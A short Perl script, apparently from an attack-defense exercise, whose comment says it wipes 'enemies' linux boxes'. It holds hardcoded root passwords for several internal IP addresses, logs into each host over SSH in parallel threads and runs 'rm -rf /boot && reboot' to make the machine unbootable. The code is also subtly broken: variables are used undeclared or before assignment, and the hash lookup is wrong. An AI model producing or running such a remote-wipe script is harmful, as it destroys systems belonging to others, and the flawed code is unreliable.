#!/usr/bin/env perl
###################
# This script wipes all of our enemies' linux boxes.
use strict;
use warnings;
use threads;


my $enemy_boxes = {
    "212" => "Liberty197!",
    "230" => "Liberty197!",
    "251" => "Liberty197!",
    "204" => "Liberty197!",
};


for my $subnet (1..4) {
    foreach my $last_octet (keys $enemy_boxes){
        $pass = $enemy_boxes{$ip};
        $ip = "10.162.$subnet.$last_octet";
        threads->create(\&deleteBox, $pass, $ip);
    }
}

for my $thread (threads->list()) {
    print $thread->join();
}


sub deleteBox {
    my ($pass, $ip) = @_;
    `echo "$pass" | ssh root@$ip -t 'rm -rf /boot && reboot'`;
    return "$ip killed";

}